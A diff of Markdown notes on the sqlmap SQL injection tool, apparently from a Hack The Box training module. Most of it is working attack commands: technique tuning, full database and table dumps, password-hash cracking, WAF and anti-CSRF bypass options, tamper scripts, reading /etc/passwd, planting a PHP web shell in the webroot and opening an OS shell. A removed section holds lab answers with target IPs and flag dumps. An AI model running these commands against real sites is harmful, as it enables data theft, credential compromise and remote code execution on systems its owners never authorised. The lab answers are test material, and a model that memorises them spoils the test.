@@ -1,75 +1,169 @@
 ### Content 
-* [Database Enumeration](#database-enumeration)
-	* [Privileges enumeration](#privileges-enumeration)
-	* [Full DB enumeration](#full-db-enumeration)
-	* [Table enumeration](#table-enumeration)
-	* [Searching for data](#searching-for-data)
-	* [Password Enumeration and Cracking](#password-enumeration-and-cracking) 
-* [Anti-Virus bypass techniques](#anti-virus-bypass-techniques)
-* [OS Exploitation](#os-exploitation)
-	* [File Read/Write](#file-read/write)
-	* [OS Command Execution](#os-command-execution)
-* [HTB module answers](#htb-module-answers)
+
+- [Tuning](#tuning)
+	- [UNION SQLi](#union-sqli)
+	- [For debugging](#for-debugging)
+	- [Level and Risk](#level-and-risk)
+- [Database Enumeration](#database-enumeration)
+	- [Privileges enumeration](#privileges-enumeration)
+	- [Full DB enumeration](#full-db-enumeration)
+	- [Table enumeration](#table-enumeration)
+	- [Searching for data](#searching-for-data)
+	- [Password Enumeration and Cracking](#password-enumeration-and-cracking)
+- [Anti-Virus bypass techniques](#anti-virus-bypass-techniques)
+	- [WAF](#waf)
+	- [Anti-CSRF Token Bypass](#anti-csrf-token-bypass)
+	- [Unique Value Bypass](#unique-value-bypass)
+	- [Calculated Parameter Bypass](#calculated-parameter-bypass)
+	- [Tamper Scripts](#tamper-scripts)
+- [OS Exploitation](#os-exploitation)
+	- [Reading Files](#reading-files)
+	- [Writing Files](#writing-files)
+	- [OS Command Execution](#os-command-execution)
+
+> [Project Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
+
 ---
-## Database Enumeration
-#### Privileges enumeration
-``` bash
-sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+### Tuning
+
+`--technique=BEUSTQ`:
+
+- `B`: Boolean-based blind
+- `E`: Error-based
+- `U`: Union query-based
+- `S`: Stacked queries
+- `T`: Time-based blind
+- `Q`: Inline queries
+
+To target a specific parameter:
+
+```bash
+# Add (*) after the variable value
+$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
+# Add paramter flag
+$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test' -p uid
+# If it's a header
+$ sqlmap http://www.example.com/ -H 'Cookie:PHPSESSID=1*'
+$ sqlmap http://www.example.com/ -H "Cookie: id=1" -p Cookie
 ```
+
+###### UNION SQLi
+
+In some cases, `UNION` SQLi payloads require extra user-provided information to work.
+
+- If we found the exact number of columns of the vulnerable SQL query: `--union-cols=17`
+- If the default "dummy" filling values used are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead: `--union-char='a'`
+- If there is a requirement to use an appendix at the end of a `UNION` query in the form of the: `--union-from=users`
+
+###### For debugging
+
+- To parse the DBMS error: `--parse-errors`
+- To store the whole traffic: `-t`
+
+###### Level and Risk
+
+The usual structure of the payload `<prefix><vector><suffix>`, the `vector` part is carrying the useful SQL query to be executed, the `prefix` and the `suffix` are called boundaries which are being used for the proper injection of the vector.
+
+```bash
+$ sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
+```
+
+- The option `--level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
+- The option `--risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).
+
+---
+### Database Enumeration
+
+[queries.xml](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml) has a predefined set of queries for all supported DBMSes, where each entry represents the SQL that must be run at the target to retrieve the desired content.
+
+#### Privileges enumeration
+
+``` bash
+$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+```
+
 #### Full DB enumeration
+
 ``` bash
 # Retrieve all tables inside the database
-sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs -D testdb
-# DB schema enumeration (retrieve the structure of all of the tables)
-sqlmap -u "http://www.example.com/?id=1" --schema
+$ sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs -D testdb
+# DB schema enumeration (retrieve the structure of all of the tables in all of the DBs)
+$ sqlmap -u "http://www.example.com/?id=1" --schema
+# DB schema enumeartion for non default DBs
+$ sqlmap -u "http://www.example.com/?id=1" --schema --exclude-sysdbs
 ```
+
 #### Table enumeration
+
 ``` bash
 # Retrieve tabele names from testdb database
-sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
+$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
 # Retrieve table content
-sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
+$ sqlmap -u "http://www.example.com/?id=1" --dump -D testdb -T users
 # Retrieve specific columns from the table
-sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
+$ sqlmap -u "http://www.example.com/?id=1" --dump -D testdb -T users -C name,surname
 # Specify how many entries will be dumped from the table
-sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
+$ sqlmap -u "http://www.example.com/?id=1" --dump -D testdb -T users --start=2 --stop=3
 # Conditional Enumeration
-sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
+$ sqlmap -u "http://www.example.com/?id=1" --dump -D testdb -T users --where="name LIKE 'f%'"
 ```
+
 #### Searching for data
+
 ``` bash
 # Search for a table that has user on its name
-sqlmap -u "http://www.example.com/?id=1" --search -T user
+$ sqlmap -u "http://www.example.com/?id=1" --search -T user
+
 # Search for a column that has pass on its name
-sqlmap -u "http://www.example.com/?id=1" --search -C pass
+$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
 ```
+
 #### Password Enumeration and Cracking
-* Crack passwords inside a specific table
 
- `sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users`
-* DB Users Password Enumeration and Cracking
+```bash
+# Crack passwords inside a specific table
+$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
 
-`sqlmap -u "http://www.example.com/?id=1" --passwords --batch`
+# DB Users Password Enumeration and Cracking
+$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
+```
 
 ---
-## Anti-Virus bypass techniques
-* Anti-CSRF Token Bypass
+### Anti-Virus bypass techniques
+
+- `--random-agent`: Randomly select a `User-agent` header value.
+- `--mobile`: Imitate the smartphone by using that same header value.
+- `--chunked`: Blacklisted keywords are split between chunks to be passed unnoticed.
+
+##### WAF
+
+`SQLMap` will try to identify the `WAF` solution used by the web application by default, utilizing a third-party library [identYwaf](https://github.com/stamparm/identYwaf), containing the signatures of 80 different WAF solutions. (`--skip-waf` to skip this test)
+
+##### Anti-CSRF Token Bypass
+
 ```bash
-sqlmap -u "http://www.example.com/" --data="id=1&csrf-t0ken=token" --csrf-token="csrf-t0ken"
+$ sqlmap -u "http://<FQDN>/" --data="id=1&csrf-t0ken=token" --csrf-token="csrf-t0ken"
 ```
-* Unique Value Bypass
+
+> If the flag `--csrf-token` is not set, if one of the provided parameters contains any of the common infixes (i.e. `csrf`, `xsrf`, `token`), the user will be prompted whether to update it in further requests.
+
+##### Unique Value Bypass
+  
 ```shell
-sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch
+$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch
 ```
-* Calculated Parameter Bypass
+
+##### Calculated Parameter Bypass
+  
 ```bash
-sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
+$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
 ```
-#### Tamper Scripts  
-example:
-```bash
-sqlmap -r req.txt --batch --tamper=between,randomcase -T flag11 --dump
-```
+
+##### Tamper Scripts
+
+Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection. `--tamper=between,randomcase`
+
+`--list-tampers` to list all tamper scripts.
 
 | **Tamper-Script**           | **Description**                                                                                                                  |
 | --------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
@@ -93,124 +187,47 @@ sqlmap -r req.txt --batch --tamper=between,randomcase -T flag11 --dump
 | `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)                                           |
 | `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                                |
 | `versionedmorekeywords`     | Encloses each keyword with (MySQL) versioned comment                                                                             |
-| `--list-tampers`            | To see all tamper scripts use                                                                                                    |
 
 ---
-## OS Exploitation
-### File Read/Write
-example:
+### OS Exploitation
+
+Checking for DBA Privileges:
+
+``` bash 
+$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
+```
+
+##### Reading Files
+
+To load the content of a file to a table and then reading that table in `MySql`, the DB user must have the privilege to `LOAD DATA` and `INSERT` to be able to execute a query like the following:
+
 ``` mysql
 LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
 ```
-* Checking for DBA Privileges
-``` bash 
-sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
-```
-* Reading Local Files
-	* in `MySql`, to read local files, the DB user must have the privilege to `LOAD DATA` and `INSERT`, to be able to load the content of a file to a table and then reading that table.
-``` bash
-sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
-```
-* Writing Local Files
-``` bash
-# If the server side is using PHP
-echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
-# Write this file on the remote server, default server webroot for Apache:
-sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+To read a file:
 
-# Access the remote PHP shell, and execute a sample command:
-curl http://www.example.com/shell.php?cmd=ls+-la
-```
-### OS Command Execution
-To get an OS shell with SQLMap, we can use the `--os-shell` option, as follows:
 ``` bash
-sqlmap -u "http://www.example.com/?id=1" --os-shell
-
-# If there is no output from our command, try to specify another technique that has a better chance of giving us direct output
-sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
-```
----
-## HTB module answers
-* flag2
-``` bash
-sqlmap -r req.txt --batch --dump
-```
-* flag3
-``` bash
-sqlmap -u http://159.65.95.114:31469/case3.php --cookie='id=1*' --dump --batch
-```
-*  flag4
-``` bash
-sqlmap -r req.txt
-```
-* flag5
-``` bash
-sqlmap -u http://159.65.95.114:32275/case5.php?id=1 --risk=3 --level=5 -T flag5 --no-cast --batch --dump
-```
-* flag6
-```bash
-sqlmap http://159.65.95.114:31761/case6.php?col=id --random-agent --batch --dump --prefix="')" --level=5 --risk=3
-```
-* flag7
-```bash
-sqlmap -r req.txt --union-cols=5 --dump
-```
-* What's the name of the column containing "style" in it's name? (Case #1)
-```bash
-sqlmap http://94.237.63.130:55858/case1.php?id=1 --search -C style
-```
-* What's the Kimberly user's password? (Case #1)
-``` bash
-sqlmap http://94.237.63.130:55858/case1.php?id=1 --dump -D testdb -T users --batch
-```
-* flag8
-```bash
-sqlmap -r req.txt --csrf-token=t0ken -T flag8 --batch --dump
-```
-* flag9
-```bash
-sqlmap -r req.txt --randomize=uid -T flag9 --batch --dump
-```
-* flag10
-```bash
-sqlmap -r req.txt  -T flag10 --batch --dump
-```
-*  flag11
-```bash
-sqlmap -r req.txt --batch --tamper=between,randomcase -T flag11 --dump
-```
-* Try to use SQLMap to read the file "/var/www/html/flag.txt".
-``` bash
-sqlmap http://94.237.62.166:58313/?id=1 --is-dba -batch --file-read "/var/www/html/flag.txt"
-```
-* Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.
-``` bash
-sqlmap -u http://94.237.62.166:40727/?id=1 --batch --os-shell
-```
-* final_flag
-	1. Locate the attack vector manually (got to shop.html)
-	2. Hover over a product and click on add to cart
-	3. Intercept the post request and work with it
-``` bash
-sqlmap -r req.txt --batch -T final_flag --dump --tamper=between,randomcase
+$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
 ```
 
-``` HTTP
-POST /action.php HTTP/1.1
-Host: 94.237.60.32:37445
-User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: http://94.237.60.32:37445/shop.html
-Content-Type: application/json
-Content-Length: 8
-Origin: http://94.237.60.32:37445
-DNT: 1
-Connection: close
-Sec-GPC: 1
+##### Writing Files
 
-{"id":1}
+``` bash
+$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+
+$ curl http://www.example.com/shell.php?cmd=ls+-la
 ```
+
+##### OS Command Execution
+
+``` bash
+$ sqlmap -u "http://www.example.com/?id=1" --os-shell
+
+# If there is no output from our command, try to specify another technique that has a better chance of giving us direct output like the Error-based SQL Injection
+$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
+```
+
 ---
